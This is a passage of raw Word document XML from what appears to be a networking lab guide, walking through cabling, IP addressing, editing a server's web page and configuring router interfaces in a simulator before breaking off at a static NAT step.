          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Switch S1 → GigabitEthernet0/0 → Router R1.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="063F0246" w14:textId="3AB004F6" w:rsidR="008F6290" w:rsidRPr="00A11CBB" w:rsidRDefault="00000000" w:rsidP="00A11CBB">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="31"/>
        </w:numPr>
        <w:spacing w:before="198" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A11CBB">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Server → FastEthernet0 → Switch S2.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E2192C8" w14:textId="0DBB1D0C" w:rsidR="008F6290" w:rsidRPr="00A11CBB" w:rsidRDefault="00000000" w:rsidP="00A11CBB">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="31"/>
        </w:numPr>
        <w:spacing w:before="198" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A11CBB">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Switch S2 → GigabitEthernet0/0 → Router R2.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E3D23EA" w14:textId="5E561A5E" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00A11CBB">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="31"/>
        </w:numPr>
        <w:spacing w:before="198" w:after="0" w:line="360" w:lineRule="auto"/>
      </w:pPr>
      <w:r w:rsidRPr="00A11CBB">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Router R1 Serial0/0/0 ↔ Serial0/0/0 Router R2 (serial cable).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A97C390" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="5E4EEB8B" wp14:editId="14AF1F3F">
            <wp:extent cx="3917195" cy="2281861"/>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0"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="3917195" cy="2281861"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B36594E" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="62399A3E" w14:textId="77777777" w:rsidR="008F6290" w:rsidRDefault="008F6290" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4F0CF80D" w14:textId="7908D0A7" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>2.Assign IP Addresses to PC and Server:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4730420B" w14:textId="77777777" w:rsidR="008F6290" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>1. Open the PC.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AB20F5C" w14:textId="77777777" w:rsidR="008F6290" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>2. Go to Desktop → IP Configuration.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F94E815" w14:textId="21627F15" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>3. Enter the details:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E9853E8" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="1D4E6F02" wp14:editId="65055F44">
            <wp:extent cx="4842913" cy="3573473"/>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1"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="4842913" cy="3573473"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="44D7C2CC" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="1A248EBE" wp14:editId="0784DD1A">
            <wp:extent cx="4855600" cy="2820812"/>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2"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="4855600" cy="2820812"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="2458EBF2" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="0260629B" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="0F22EC44" wp14:editId="49CE9A8F">
            <wp:extent cx="4499467" cy="292560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3"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="4499467" cy="2925605"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="4688BAF9" w14:textId="77777777" w:rsidR="008F6290" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>1. Open the Server.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="086FF351" w14:textId="77777777" w:rsidR="008F6290" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>2. Go to Desktop → IP Configuration.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46B396EB" w14:textId="0679C464" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>3. Enter the details:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72B1A191" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="160C4016" wp14:editId="6F034130">
            <wp:extent cx="4572906" cy="3152197"/>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4"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="4572906" cy="3152197"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="2390339C" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FAAC713" w14:textId="77777777" w:rsidR="008F6290" w:rsidRDefault="008F6290" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6E18ABEE" w14:textId="26DAE3AC" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>1.Go to services tab,</w:t>
      </w:r>
      <w:r w:rsidR="000A00BE">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>edit index.html</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4388B582" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="6AE8CD4A" wp14:editId="00187DA8">
            <wp:extent cx="4342079" cy="2503826"/>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5"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="4342079" cy="2503826"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="15235143" w14:textId="77777777" w:rsidR="008F6290" w:rsidRDefault="008F6290" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6EA8135E" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>2.Change the heading.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40FBE081" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="46994D8E" wp14:editId="02410AEC">
            <wp:extent cx="4354488" cy="2497334"/>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6"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="4354488" cy="2497334"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="387F1EFC" w14:textId="77777777" w:rsidR="008F6290" w:rsidRDefault="008F6290" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="36385921" w14:textId="106FD05C" w:rsidR="00AB6281" w:rsidRDefault="00000000" w:rsidP="00AB6281">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>3.Open browser in PC1 and type the following url. Notice the Change in heading.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68FDB412" w14:textId="6FB60DB2" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="008F6290">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="144CA1AE" wp14:editId="5AE34E8D">
            <wp:extent cx="4373946" cy="2383484"/>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7"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="4373946" cy="2383484"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="07FDB4CE" w14:textId="77777777" w:rsidR="00AB6281" w:rsidRDefault="00AB6281" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="53ABF5D8" w14:textId="77777777" w:rsidR="00AB6281" w:rsidRDefault="00AB6281" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="67F21684" w14:textId="2B0E0393" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>3.Configure the routers</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2194FF0E" w14:textId="5CCC67AA" w:rsidR="00AB6281" w:rsidRPr="00A11CBB" w:rsidRDefault="00000000" w:rsidP="00A11CBB">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="32"/>
        </w:numPr>
        <w:spacing w:before="198" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A11CBB">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Click on the router,go to config tab.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="433FFF82" w14:textId="28B1BDB3" w:rsidR="00AB6281" w:rsidRPr="00A11CBB" w:rsidRDefault="00000000" w:rsidP="00A11CBB">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="32"/>
        </w:numPr>
        <w:spacing w:before="198" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A11CBB">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Under interface,select the port connected . Mark the tick box “on”. Fill the ip address and subnet mask.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D56A915" w14:textId="45C746CE" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00A11CBB">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="32"/>
        </w:numPr>
        <w:spacing w:before="198" w:after="0" w:line="360" w:lineRule="auto"/>
      </w:pPr>
      <w:r w:rsidRPr="00A11CBB">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Repeat for all the ports in both the routers.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1514711D" w14:textId="77777777" w:rsidR="00AB6281" w:rsidRDefault="00000000" w:rsidP="00AB6281">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="5D496CDC" wp14:editId="64E21481">
            <wp:extent cx="4476655" cy="2479281"/>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8"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="4476655" cy="2479281"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BB9D72C" w14:textId="77777777" w:rsidR="00AB6281" w:rsidRDefault="00AB6281" w:rsidP="00AB6281">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0A7B54CB" w14:textId="77777777" w:rsidR="00AB6281" w:rsidRDefault="00AB6281" w:rsidP="00AB6281">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="56FCCBB5" w14:textId="61A1BE75" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00AB6281">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="503977DF" wp14:editId="47B88C24">
            <wp:extent cx="4500247" cy="2799166"/>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9"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="4500247" cy="2799166"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A5D6AE9" w14:textId="77777777" w:rsidR="00AB6281" w:rsidRDefault="00000000" w:rsidP="00AB6281">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="0DE50AA9" wp14:editId="26D6B71C">
            <wp:extent cx="4482415" cy="2694520"/>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0"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="4482415" cy="2694520"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="5EED459A" w14:textId="77777777" w:rsidR="00AB6281" w:rsidRDefault="00AB6281" w:rsidP="00AB6281">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="01A1A63A" w14:textId="5CDB2A29" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00AB6281">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="163B6C1D" wp14:editId="00AF5E32">
            <wp:extent cx="4476637" cy="2732904"/>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1"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="4476637" cy="2732904"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F0C0F5F" w14:textId="77777777" w:rsidR="00AB6281" w:rsidRDefault="00AB6281" w:rsidP="00AB6281">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3172B086" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Static NAT Mapping on Router1:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55CE4E89" w14:textId="77777777" w:rsidR="00AB6281" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Open R1 → CLI</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17EADA07" w14:textId="184CCFD8" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Enter:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27BAF940" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
